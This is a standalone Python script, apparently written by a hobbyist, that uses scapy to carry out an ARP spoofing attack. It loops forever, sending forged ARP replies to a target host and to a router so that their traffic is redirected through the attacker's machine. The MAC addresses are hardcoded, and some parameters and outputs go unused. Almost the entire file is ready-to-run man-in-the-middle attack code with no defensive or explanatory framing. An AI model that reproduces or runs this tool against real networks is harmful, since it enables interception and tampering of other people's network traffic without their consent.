import optparse
import scapy.all as scapy
from scapy.all import sr1,TCP,IP,send
import subprocess as subp
import time

parser = optparse.OptionParser()
parser.add_option("--i","--interface",dest="interface",help="this require interface")
parser.add_option("--ip",dest="ip_address",help="enter ip address")
parser.add_option("--t_ip",dest="target_ip",help="enter the ip address to change")
parser.add_option("--s_ip",dest="spoof_ip",help="enter the ip address to change")
parser.add_option("--v_mac",dest="mac_ad",help="ENter The MAc ADress")
(values,keys) = parser.parse_args()
interface = values.interface
ip_address = values.ip_address
t_ip = values.target_ip 
s_ip = values.spoof_ip
mac_ad = values.mac_ad

see_out = subp.check_output(['ifconfig','wlan0'])

def main():
    if interface == None:
        print("INterface NOt SElected")
    else:
        print(interface)
def send_packet(target_ip,spoof_ip,mac_address):
    # packet = sr1(IP(src="192.168.0.1",dst="192.168.0.3")/TCP(sport=135,dport=135)/"hello new world")
    # send(packet)
    packet = scapy.ARP(op=2,psrc=spoof_ip,hwdst= "54:dc:1d:52:12:3a",pdst=target_ip)
    packet_for_router = scapy.ARP(op=2,psrc=target_ip,hwdst= "6c:72:20:fb:9f:57",pdst=spoof_ip)
    no_of_packets_sent = 0
    #adding try/exception block to below loop
    try:
        while True:
            scapy.send(packet,verbose = False)
            scapy.send(packet_for_router,verbose=False)
            no_of_packets_sent += 2
            print("[+] We have sent two packets 1 to {0} and 1 to {1}".format(target_ip,spoof_ip))
            print("[+]number of packets send :",no_of_packets_sent)
            #dynamic priting statement
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n")
        print("sending of pacekets ended")
        print("number of packets send :",no_of_packets_sent)
if __name__ == "__main__":
    main()
    send_packet(t_ip,s_ip,mac_ad)
